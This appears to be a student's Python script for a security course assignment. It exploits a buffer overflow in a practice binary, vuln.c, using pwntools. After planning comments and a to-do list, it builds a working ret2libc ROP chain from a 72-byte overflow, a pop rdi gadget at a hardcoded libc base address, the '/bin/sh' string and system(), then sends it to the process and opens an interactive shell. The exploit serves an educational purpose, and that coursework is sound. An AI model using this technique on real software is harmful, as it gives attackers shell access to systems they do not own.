# Python program to exploit vuln.c for Assessment 2

# Use a ROP/ret2libc method. (as NX protected)

# Need to decide what vulnerability to exploit.  
# Some options:
# - Call a hidden function (maybe too trivial though)
# - Call /bash/sh
# - ret2libc and ROP with ASLR and NX enabled?


# To Do before submitting:
# - Insert original Assembly in Python script as comments.
# - Explain method being used and instructions for use.
# - Ensure all code is commented with an explanation of its purpose.
# - GOT and PLT usage explained - if used (ASLR?)
# - Explain how vuln.c was compiled, security features etc.
# - If going to use PWNTOOLS, include info on install.
# - if NOT using ASLR, explin to disable it before exe.

# Questions to answer
# - Will memory addresses of system ROP Gadgets be the same 
#      between systems - since we know the base system?
# - Can I use pwntools for this? Brief doesn't say I can't, and can
#      change this script to execute independently. (instead of called via .txt)

#!/usr/bin/python3

from pwn import *
from struct import pack

# starting gdb with our binary and continuing execution
# p = gdb.debug('./vuln', '''
#     b *0x401184
#     c
# ''') 
p = process('./vuln') 

binary = ELF('./vuln') # loading the binary into pwntools
context.binary = binary # setting up all pwntool settings suited for the binary
rop = ROP(binary) # loading our binary to look for gadgets and building rop chains
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
p.recvuntil(b"Password:") # we tell pwntools to wait until it receives the string in stdout


###TRY THIS METHOD.  pop rdi and ret from libc using offsets.
libc_base_addr = 0x00007ffff7dc4000
poprdi = libc_base_addr + 0x0000000000028215
ret = libc_base_addr + 0x000000000002668c

libc.address = 0x00007ffff7dc4000
rop.raw(b"A"*72)  # Overflow
#rop.raw(pack("<I",0xdeadbeef)) # RIP test
#rop.raw(0x40114a) # pop rdi
rop.raw(poprdi) # pop rdi
rop.raw(next(libc.search(b'/bin/sh')))  # Search for the string /bin/sh
#rop.raw(0x40114b) # ret
rop.raw(ret)  # ret from libc - test with and without
rop.raw(libc.symbols['system'])

# Generate the ROP chain
rop_chain = rop.chain()

# Write the ROP chain to a file
with open('rop_chain.txt', 'wb') as f:
    f.write(rop_chain)

p.sendline(rop_chain)
#p.sendline(rop.chain())
p.interactive() # to continue interacting with pythonpwn